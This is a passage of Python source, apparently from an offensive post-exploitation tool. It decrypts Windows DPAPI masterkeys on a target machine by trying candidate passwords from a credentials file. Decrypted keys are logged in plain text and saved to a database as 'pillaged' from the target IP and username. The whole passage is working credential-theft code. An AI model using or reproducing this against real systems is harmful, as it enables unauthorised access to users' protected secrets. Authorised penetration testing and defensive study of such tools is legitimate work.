                'status'] != 'decrypted':  # localfile not in user.masterkeys:
                self.logging.debug(
                    f"[{self.options.target_ip}] [...] Testing decoding {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with credz")
                for username in self.options.credz:
                    if username in user.username:  # pour fonctionner aussi avec le .domain ou les sessions multiple citrix en user.domain.001 ?
                        self.logging.debug(
                            f"[{self.options.target_ip}] [...] Testing {len(self.options.credz[user.username])} credz for user {user.username}")
                        # for test_cred in self.options.credz[user.username]:
                        try:
                            self.logging.debug(
                                f"[{self.options.target_ip}]Trying to decrypt {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with user SID {user.sid} and {len(self.options.credz[username])}credential(s) from credz file")
                            myoptions = copy.deepcopy(self.options)
                            myoptions.file = localfile  # Masterkeyfile to parse
                            # myoptions.password = self.options.credz[username]
                            myoptions.sid = user.sid
                            myoptions.pvk = None
                            myoptions.key = None
                            mydpapi = DPAPI(myoptions, self.logging)
                            decrypted_masterkey = mydpapi.decrypt_masterkey(passwords=self.options.credz[username])
                            if decrypted_masterkey != -1 and decrypted_masterkey != None:
                                # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
                                user.masterkeys_file[guid]['status'] = 'decrypted'
                                user.masterkeys_file[guid]['key'] = decrypted_masterkey
                                # user.masterkeys[localfile] = decrypted_masterkey
                                user.type = 'LOCAL'
                                user.type_validated = True
                                self.logging.debug(
                                    f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for User {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                                self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                         status=user.masterkeys_file[guid]['status'],
                                                         decrypted_with=f"Password:{self.options.credz[username]}",
                                                         decrypted_value=decrypted_masterkey,
                                                         pillaged_from_computer_ip=self.options.target_ip,
                                                         pillaged_from_username=user.username)
                                return user.masterkeys_file[guid]
                            else:
                                self.logging.debug(
                                    f"[{self.options.target_ip}] error decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey  {guid} with {len(self.options.credz[username])} passwords from user {username} in cred list")
                        except Exception as ex:
                            self.logging.debug(
                                f"[{self.options.target_ip}] Except decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey with {len(self.options.credz[username])} passwords from user {username} in cred list")
                            self.logging.debug(ex)
                else:
                    self.logging.debug(
                        f"[{self.options.target_ip}] {bcolors.FAIL}no credential in credz file for user {user.username} and masterkey {guid} {bcolors.ENDC}")
            # on a pas su le dechiffrer, mais on conseve la masterkey
            '''if localfile not in user.masterkeys:
				user.masterkeys[localfile] = None'''
            if user.masterkeys_file[guid]['status'] == 'encrypted':
                # user.masterkeys_file[guid]['status'] = 'decryption_failed'
                self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                         status=user.masterkeys_file[guid]['status'], decrypted_with='',
                                         decrypted_value='',
                                         pillaged_from_computer_ip=self.options.target_ip,
                                         pillaged_from_username=user.username)
                return -1
            elif user.masterkeys_file[guid]['status'] == 'decrypted':  # Should'nt go here
                return user.masterkeys_file[guid]

def is_certificate_guid(value: str):
    guid = re.compile(r'^(\{{0,1}([0-9a-fA-F]{32})_([0-9a-fA-F]{8})-([0-9a-fA-F]{4})-([0-9a-fA-F]{4})-([0-9a-fA-F]{4})-([0-9a-fA-F]{12})\}{0,1})$')
    return guid.match(value)
